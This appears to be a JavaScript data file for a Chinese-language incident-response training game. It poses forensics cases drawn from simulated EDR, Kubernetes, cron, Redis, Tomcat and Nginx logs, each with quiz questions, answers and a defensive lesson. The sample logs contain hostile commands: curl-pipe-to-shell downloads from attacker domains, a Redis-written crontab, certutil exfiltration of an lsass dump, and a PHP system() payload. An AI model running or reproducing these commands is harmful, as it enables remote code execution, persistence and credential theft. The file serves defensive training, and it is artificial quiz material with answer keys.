      '03:00:00 PUSH library/nginx:1.25 by=dev-ci (来源校验: 正常)',
      '03:30:00 PUSH library/nginx:1.25 by=unknown-external (签名校验: FAIL)',
      '03:30:10 SCAN library/nginx:1.25 发现 kdevtmpfsi (风险: 高)',
    ]},
    tasks: [
      { q: '被投毒的镜像名（含 tag）', hint: '签名校验 FAIL 的那条', ans: ['library/nginx:1.25'] },
      { q: '镜像里携带的挖矿程序名', hint: 'SCAN 行', ans: ['kdevtmpfsi'] },
    ], teach: '⛏️ 镜像签名校验 + 仓库推送实名制，投毒根本进不来。' },

  { id: 'k3', ico: '☸️', cat: '容器审计', diff: 3, title: 'K8s 提权三部曲',
    brief: 'K8s 审计日志出现可疑的 ClusterRoleBinding 与 exec。',
    files: { '/case/k8s_audit.json': [
      '{"time":"04:00:00","verb":"create","object":"clusterrolebinding.rbac","name":"cluster-admin-tmp","user":"dev:sam"}',
      '{"time":"04:00:01","verb":"create","object":"pod","name":"debug-pod","user":"dev:sam","image":"busybox"}',
      '{"time":"04:02:00","verb":"create","object":"pods/exec","pod":"prod-api-7d9","user":"dev:sam","container":"main"}',
    ]},
    tasks: [
      { q: '被创建的恶意 ClusterRoleBinding 名', hint: 'clusterrolebinding 那条的 name', ans: ['cluster-admin-tmp'] },
      { q: '被 exec 进入的生产 Pod 名', hint: 'pods/exec 那条', ans: ['prod-api-7d9'] },
    ], teach: '☸️ K8s RBAC 变更 + pods/exec 必须审计告警，开发者账号最小权限。' },

  /* ═══════════ 终端行为 EDR ═══════════ */
  { id: 'e1', ico: '📝', cat: '终端行为EDR', diff: 1, title: 'Word 生出了 Cmd',
    brief: '办公文档不该拉起命令行。进程链已经说明问题。',
    files: { '/case/edr_proc.csv': [
      'time,host,parent,child,cmdline',
      '09:00:01,PC-15,explorer.exe,WINWORD.EXE,打开 报价单.docm',
      '09:00:03,PC-15,WINWORD.EXE,cmd.exe,/c powershell -enc SQBFAFgA',
      '09:00:04,PC-15,cmd.exe,powershell.exe,-nop -w hidden -enc SQBFAFgA',
    ]},
    tasks: [
      { q: '异常的父进程名（谁拉起了 cmd）', hint: 'child=cmd.exe 那条的 parent', ans: ['WINWORD.EXE'] },
      { q: '最终的恶意负载进程名', hint: '进程链最后一级', ans: ['powershell.exe'] },
    ], teach: '📝 Office→cmd→powershell 是宏攻击的标准链，父进程基线是关键。' },

  { id: 'e2', ico: '🚚', cat: '终端行为EDR', diff: 2, title: 'psexec 在内网横冲直撞',
    brief: '多台机器同时出现远程服务安装。这是横向移动。',
    files: { '/case/edr_net.csv': [
      'time,src_host,dst_host,port,service,detail',
      '11:00:00,PC-15,PC-08,445,SMB,psexesvc.exe 安装 (psexec)',
      '11:00:05,PC-15,PC-09,445,SMB,psexesvc.exe 安装 (psexec)',
      '11:00:10,PC-08,PC-15,445,SMB,正常文件共享',
    ]},
    tasks: [
      { q: '被投放的横向服务名', hint: 'detail 里的服务文件', ans: ['psexesvc.exe'] },
      { q: '横向移动的发起主机', hint: '连续投放的 src_host', ans: ['PC-15'] },
    ], teach: '🚚 横向的解药是：本地管理员密码随机化 + 关闭默认共享+最小授权。' },

  { id: 'e3', ico: '💾', cat: '终端行为EDR', diff: 3, title: '内存里的密码被倒走了',
    brief: 'EDR 抓到 lsass 转储与外传。完整还原动作链。',
    files: { '/case/edr_proc.csv': [
      'time,host,parent,child,cmdline',
      '16:00:00,PC-15,cmd.exe,rundll32.exe,comsvcs.dll MiniDump 720 C:\\temp\\ls.dmp full',
      '16:01:00,PC-15,cmd.exe,certutil.exe,-urlcache -f http://evil-cdn.net/up ls.dmp',
    ]},
    tasks: [
      { q: '执行内存转储的系统工具（含参数里加载的 dll 名）', hint: '第一行 cmdline', ans: ['comsvcs.dll'] },
      { q: '外传使用的系统下载器命令', hint: '第二行 child', ans: ['certutil.exe'] },
    ], teach: '💾 rundll32+comsvcs.dll 与 certutil 都是 LOLBAS——用原生工具干坏事最难防，要靠行为基线。' },

  /* ═══════════ Linux 系统日志 ═══════════ */
  { id: 's1', ico: '⏱️', cat: 'Linux系统日志', diff: 1, title: 'crontab 里的陌生人',
    brief: 'cron 日志出现每分钟执行的可疑下载命令。',
    files: { '/var/log/cron': [
      'Mar 10 02:00:01 web01 CROND[101]: (root) CMD (/usr/bin/backup.sh)',
      'Mar 10 02:00:01 web01 CROND[102]: (root) CMD (curl -s http://upd-keeper.xyz/s|sh)',
      'Mar 10 02:01:01 web01 CROND[110]: (root) CMD (curl -s http://upd-keeper.xyz/s|sh)',
      'Mar 10 02:02:01 web01 CROND[120]: (root) CMD (/usr/bin/backup.sh)',
    ]},
    tasks: [
      { q: '可疑下载的域名', hint: 'grep curl /var/log/cron', ans: ['upd-keeper.xyz'] },
      { q: '恶意任务每多少分钟执行一次（数字）', hint: '看相邻执行的时间差', ans: ['1'] },
    ], teach: '⏱️ curl|sh 定时任务 = 远控常驻。清 cron + 找落地文件 + 封域名。' },

  { id: 's2', ico: '🧲', cat: 'Linux系统日志', diff: 2, title: '被劫持的 ls',
    brief: '审计显示系统命令被动态库劫持，输出被篡改。',
    files: { '/var/log/audit/audit.log': [
      'type=SYSCALL msg=audit(1741) exe="/bin/ls" env=LD_PRELOAD=/usr/lib/libprocess.so',
      'type=SYSCALL msg=audit(1742) exe="/bin/ps" env=LD_PRELOAD=/usr/lib/libprocess.so',
      'type=SYSCALL msg=audit(1743) exe="/usr/bin/curl" env=(null)',
    ], '/var/log/dpkg.log': [
      '2026-03-09 22:10:01 install libprocess:1.0 <unknown-origine>',
    ]},
    tasks: [
      { q: '被 LD_PRELOAD 劫持的库文件名', hint: 'grep LD_PRELOAD /var/log/audit/audit.log', ans: ['libprocess.so'] },
      { q: '该库的安装来源记录显示的包名', hint: 'dpkg.log 里的 install 行', ans: ['libprocess'] },
    ], teach: '🧲 LD_PRELOAD rootkit 让 ps/ls 隐身——审计 env 比看进程表更可靠。' },

  { id: 's3', ico: '👁️', cat: 'Linux系统日志', diff: 3, title: '内核模块在隐身',
    brief: 'dmesg 与模块列表对照，找出隐藏的恶意驱动。',
    files: { '/var/log/dmesg': [
      '[ 0.100000] kernel: systemd 启动',
      '[ 1200.400] kernel: module dreike loaded (tainted)',
      '[ 1200.401] kernel: hooking sys_call_table',
    ], '/proc/modules.snapshot': [
      'nvidia 12345678 0 - Live 0x000000 (O)',
      'dreike 16384 0 - Live 0xffffff (OE)',
    ]},
    tasks: [
      { q: '恶意内核模块名', hint: 'grep hooking /var/log/dmesg 前后看 module', ans: ['dreike'] },
      { q: '该模块 hook 的系统表名', hint: 'dmesg 里 hooking 那行', ans: ['sys_call_table'] },
    ], teach: '👁️ 装内核模块必然留 dmesg 痕迹——模块白名单 + secure boot 按住它。' },

  /* ═══════════ 中间件日志 ═══════════ */
  { id: 't1', ico: '🐈', cat: '中间件日志', diff: 1, title: 'Tomcat 后台被部署了马',
    brief: 'manager 应用日志显示有人用弱口令部署了 war。',
    files: { '/var/log/tomcat/manager.log': [
      '10:00:00 GET /manager/html 401 (auth failed user=admin)',
      '10:00:05 GET /manager/html 401 (auth failed user=admin)',
      '10:00:10 PUT /manager/text/deploy?path=/shell 200 (user=admin)',
      '10:01:00 GET /shell/ 200',
    ]},
    tasks: [
      { q: '被部署的应用路径', hint: 'deploy 那行的 path 参数', ans: ['/shell'] },
      { q: '部署使用的账号', hint: '200 那条的 user', ans: ['admin'] },
    ], teach: '🐈 manager 后台必须改强口令+限内网，部署动作要审计。' },

  { id: 't2', ico: '🟥', cat: '中间件日志', diff: 2, title: 'Redis 写进了 crontab',
    brief: '未授权访问的 Redis 被用来写计划任务。',
    files: { '/var/log/redis/redis.log': [
      '02:00:00 CONFIG SET dir /var/spool/cron/',
      '02:00:00 CONFIG SET dbfilename root',
      '02:00:01 SET "crontab" "\\n*/1 * * * * curl http://45.83.66.20/s|sh\\n"',
      '02:00:02 SAVE',
    ]},
    tasks: [
      { q: '被写入的目标文件名', hint: 'dbfilename 设置', ans: ['root'] },
      { q: '定时任务下载的恶意 IP', hint: 'SET 的 value 里', ans: ['45.83.66.20'] },
    ], teach: '🟥 Redis 必须 requirepass + bind 内网 + 禁 CONFIG 命令。' },

  { id: 't3', ico: '🌀', cat: '中间件日志', diff: 3, title: '解析漏洞 + 日志注入',
    brief: 'Nginx 错误日志被注入了恶意载荷并可能被解析执行。',
    files: { '/var/log/nginx/error.log': [
      '2026/03/10 03:00:01 [error] access to /upload/xx.php%00.jpg failed',
      '2026/03/10 03:00:10 [error] upstream sent "Set-Cookie: x=<?php system(\'curl http://evil-cdn.net/c\');?>"',
      '2026/03/10 03:01:00 [warn] upstream sent "Set-Cookie: sid=abc123"',
    ]},
    tasks: [
      { q: '被尝试利用解析漏洞的脚本路径', hint: '第一行 access to 后面', ans: ['/upload/xx.php%00.jpg'] },
      { q: '注入载荷里的 C2 域名', hint: '看 <?php 那行', ans: ['evil-cdn.net'] },
    ], teach: '🌀 拼接式解析漏洞（%00 截断）+ 日志注入都是老漏洞新活——上传白名单+日志转义。' },
  ];
})();
